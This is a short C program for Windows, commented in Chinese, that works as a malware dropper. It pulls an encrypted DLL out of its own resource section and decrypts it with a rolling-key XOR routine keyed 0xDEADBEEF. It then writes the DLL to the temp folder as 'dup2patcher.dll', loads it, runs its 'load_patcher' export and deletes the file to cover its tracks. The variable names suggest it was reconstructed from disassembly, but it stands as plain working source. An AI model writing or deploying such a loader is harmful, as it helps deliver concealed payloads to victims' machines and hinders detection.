#include <windows.h>

/**
 * 资源区加密 DLL 解密函数
 * 算法：基于滚动密钥与循环移位的逐字节异或解密
 */
void DecryptPayload(unsigned char* buffer, unsigned int size, unsigned int key) {
    unsigned int ebx = key;
    for (unsigned int ecx = size; ecx > 0; ecx--) {
        unsigned char dl = *buffer;

        // 异或解密当前字节
        *buffer = dl ^ (unsigned char)(ebx & 0xFF);
        buffer++;

        // 32 位循环右移 1 位
        ebx = (ebx >> 1) | (ebx << 31);

        // 异或更新低位密钥
        ebx = (ebx & ~0xFF) | (((ebx & 0xFF) ^ dl) & 0xFF);

        // 密钥累加剩余计数
        ebx = (ebx + ecx) & 0xFFFFFFFF;
    }
}

/**
 * 将解密后的内存数据写入磁盘临时文件
 */
DWORD WriteToDisk(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite) {
    HANDLE hFile = CreateFileA(
        lpFileName,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD bytesWritten = 0;
    WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &bytesWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    return bytesWritten;
}

/**
 * 主入口函数
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HMODULE hModule = GetModuleHandleA(NULL);

    // 1. 定位资源区中的加密 DLL (Type: "DLL", ID: 10)
    HRSRC hResInfo = FindResourceA(hModule, (LPCSTR)10, "DLL");
    if (!hResInfo) {
        ExitProcess(0);
    }

    DWORD resSize = SizeofResource(hModule, hResInfo);
    HGLOBAL hResData = LoadResource(hModule, hResInfo);
    if (!hResData) {
        ExitProcess(0);
    }

    // 2. 分配内存并拷贝资源数据
    void* buffer = VirtualAlloc(NULL, resSize, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) {
        ExitProcess(0);
    }
    RtlMoveMemory(buffer, hResData, resSize);

    // 3. 执行解密 (固定密钥: 0xDEADBEEF)
    DecryptPayload((unsigned char*)buffer, resSize, 0xDEADBEEF);

    // 4. 获取系统 %TEMP% 路径并拼接文件名
    char tempPath[MAX_PATH];
    GetTempPathA(sizeof(tempPath), tempPath);
    lstrcatA(tempPath, "\\dup2patcher.dll");

    // 5. 写入解密后的 DLL 到临时目录
    WriteToDisk(tempPath, buffer, resSize);

    // 6. 动态加载并调用 load_patcher() 导出函数
    HMODULE hDll = LoadLibraryA(tempPath);
    if (hDll) {
        typedef void (*LOAD_PATCHER_FN)(void);
        LOAD_PATCHER_FN pfnLoadPatcher = (LOAD_PATCHER_FN)GetProcAddress(hDll, "load_patcher");
        if (pfnLoadPatcher) {
            pfnLoadPatcher();
        }
        // 7. 运行结束，释放模块并擦除临时文件
        FreeLibrary(hDll);
        DeleteFileA(tempPath);
    }

    ExitProcess(0);
    return 0;
}
